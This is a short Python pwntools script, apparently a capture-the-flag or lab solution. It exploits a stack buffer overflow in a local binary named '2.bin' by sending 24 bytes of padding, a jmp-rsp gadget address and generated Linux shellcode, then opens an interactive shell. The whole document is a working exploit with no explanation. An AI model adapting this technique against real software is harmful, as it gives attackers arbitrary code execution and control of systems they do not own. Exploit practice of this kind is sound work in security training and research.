
from pwn import *

context.arch="x86_64"

JMPRSP=0x401181
SHELLCODE=asm(shellcraft.amd64.linux.sh())

p = process("./2.bin")

p.send(b"A"*24 + p64(JMPRSP) + SHELLCODE + b"\n")

p.interactive()
